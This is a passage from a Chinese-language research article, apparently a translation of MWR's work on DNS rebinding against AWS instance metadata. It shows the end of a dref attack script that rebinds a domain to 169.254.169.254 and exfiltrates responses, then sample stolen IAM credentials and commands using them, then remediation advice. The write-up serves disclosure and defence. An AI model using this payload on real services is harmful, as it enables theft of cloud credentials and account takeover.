      // configure the A record to point to the AWS metadata endpoint when triggered
      network.postJSON(session.baseURL + '/arecords', {
        domain: window.env.target + '.' + window.env.domain,
        address: '169.254.169.254'
      })
      session.triggerRebind().then(() => {
        // exfiltrate the response from the provided args.path argument
        network.get(session.baseURL + window.args.path, (code, headers, body) => {
          session.log({code: code, headers: headers, body: body})
        })
      })
    }
    main()
**攻击AWS**
* * *
关于能够从AWS元数据端点读取数据的安全漏洞，已经有许多[文献](https://www.google.com/search?q=aws+ssrf
"文献")进行了详细的介绍，所以，本文不会对其进行深入讨论。
请求/latest/user-data/path时，会返回开发人员希望对各个实例开放的信息。这通常是一个bash脚本，其中包含S3存储桶的凭证或路径，例如：
    "data": {
      "code": 200,
      "body": "
    #!/bin/bash -xe
    echo 'KUBE_AWS_STACK_NAME=acme-prod-Nodeasgspotpool2-AAAAAAAAAAAA' >> /etc/environment
    [...]
    run bash -c \"aws s3 --region $REGION cp s3://acme-kube-prod-978bf8d902cab3b72271abf554bb539c/kube-aws/clusters/acme-prod/exported/stacks/node-asg-spotpool2/userdata-worker-4d3482495353ecdc0b088d42510267be8160c26bff0577915f5aa2a435077e5a /var/run/coreos/$USERDATA_FILE\"
    [...]
    exec /usr/bin/coreos-cloudinit --from-file /var/run/coreos/$USERDATA_FILE
      "
    }
除了显示了一个S3存储桶之外，输出内容还表明，该服务正在Kubernetes上运行，并使用了亚马逊的Auto-Scaling
Group（ASG）和Spot实例。由于这里使用了Kubernetes，由此我们可以推断，除了本文介绍的利用方法之外，可能还存在其他的利用途径。
与端点交互的主要战利品是临时安全凭证。我们可以从/latest/meta-data/iam/security-credentials/path中获取可用的安全凭证列表：
    "data": {
        "code": 200,
        "body": "eu-north-1-role.kube.nodes.asgspot2"
    }
我们可以通过请求/latest/meta-data/iam/security-credentials/eu-north-1-role.kube.nodes.asgspot2来获取这些凭证：
    "data": {
      "code": 200,
      "body": "
    \"Code\" : \"Success\",
    \"LastUpdated\" : \"2018-08-05T15:33:26Z\",
    \"Type\" : \"AWS-HMAC\",
    \"AccessKeyId\" : \"AKIAI44QH8DHBEXAMPLE\",
    \"SecretAccessKey\" : \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",
    \"Token\" : \"AQoDYXdzEJr[....]\",
    \"Expiration\" : \"2018-08-05T22:00:54Z\"
      "
    }"
然后，可以使用这些凭证来完成AWS API的身份验证：
    $ export AWS_ACCESS_KEY_ID=AKIAI44QH8DHBEXAMPLE
    $ export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
    $ export AWS_SESSION_TOKEN=AQoDYXdzEJr[...]
    $ aws ec2 describe-instances
    [...]
当然，该漏洞的影响程度取决于凭证被授予的权限，从完全接管到信息泄露皆有可能。即使权限较低，攻击者也可以利用这类访问权限来发现其他攻击路径或提权。
**补救措施**
* * *
**AWS**
在AWS环境中，应始终采取相应的安全措施来防止出现与AWS元数据端点的非预期交互。由于服务可能需要访问端点，因此，可以在实例上实施iptables规则以限制向具有root权限的进程发送流量，同时确保与用户输入交互的进程不以root身份运行。
当然，这种手法不仅可以攻击AWS元数据端点，因为其他网络服务可能也含有漏洞。所以，也需要为其实施相应的防火墙规则。
与往常一样，最小特权原则在这里也适用：不要给安全凭证赋予过多的权限，给予的权限，够用即可。
**DNS重绑定**
通常情况下，外部DNS应答是不必提供内部IP地址的。所以，如果可能的话，应删除这类DNS应答。
此外，使用SSL/TLS进行封装的服务和验证Host头部的服务不会受到DNS重绑定的影响。
**结束语**
* * *
虽然DNS重绑定一直认为存在理论风险，但历史上该漏洞从未被认真对待过。并且，该攻击的传统手法通常允许通过更直接的方式来利用受害者。
然而，这项研究表明，相关的手法并不仅限于网络钓鱼和水坑攻击。任何直接或间接处理用户提供的URL的服务都可能存在安全风险。
所以，对于实现这类服务的工程师来说，应认真考虑是否授予不可信脚本访问权限，并据此做出相应的设计调整。
**工具**
* * *
至于MWR的DNS重绑定框架，即dref，读者可以从[GitHub](https://github.com/mwrlabs/dref
"GitHub")下载。
此外，reson8工具也将很快公之于众。届时，安全专业人员可以使用该工具来检测将向利用HTTP头部提交的URL发送请求的Web应用程序。此外，reson8还可以用于测试海量的URL。对于单个测试用例，作者推荐PortSwigger提供的工具collaborator-everywhere。
**致谢**
* * *
感谢MWR的Markus Blechinger和Adam Williams在本研究过程中为我们提供了宝贵见解和提示。